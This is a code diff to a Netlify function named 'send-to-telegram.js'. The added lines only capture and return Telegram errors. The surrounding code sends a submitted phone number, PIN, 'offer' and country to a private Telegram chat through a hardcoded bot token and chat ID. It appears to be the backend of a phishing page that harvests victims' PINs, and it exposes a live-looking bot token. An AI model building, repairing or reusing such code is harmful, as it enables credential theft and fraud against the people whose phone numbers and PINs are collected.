@@ -1,6 +1,6 @@
 // netlify/functions/send-to-telegram.js
 
-// HARDCODED CREDENTIALS - NO ENVIRONMENT VARIABLES NEEDED
+// ✅ HARDCODED CREDENTIALS - NO ENVIRONMENT VARIABLES NEEDED
 const TELEGRAM_BOT_TOKEN = '8834457288:AAEwsXLbfzRp54OnBcE-12jMhaZY_0e-Nz4';
 const TELEGRAM_CHAT_ID = '8834429633';
 
@@ -55,6 +55,7 @@ ${flag} *Country:* ${country}
             `;
 
             let telegramSuccess = false;
+            let telegramError = null;
 
             try {
                 const telegramResponse = await fetch(
@@ -74,11 +75,12 @@ ${flag} *Country:* ${country}
                     telegramSuccess = true;
                     console.log(`✅ Telegram sent for ${phone}`);
                 } else {
-                    const errorText = await telegramResponse.text();
-                    console.error(`❌ Telegram error: ${errorText}`);
+                    telegramError = await telegramResponse.text();
+                    console.error(`❌ Telegram error: ${telegramError}`);
                 }
             } catch (error) {
-                console.error(`❌ Telegram error: ${error.message}`);
+                telegramError = error.message;
+                console.error(`❌ Telegram error: ${telegramError}`);
             }
 
             return {
@@ -93,7 +95,8 @@ ${flag} *Country:* ${country}
                         phone: phone,
                         pin: pin,
                         offer: offer,
-                        telegramSent: telegramSuccess
+                        telegramSent: telegramSuccess,
+                        telegramError: telegramError
                     }
                 })
             };
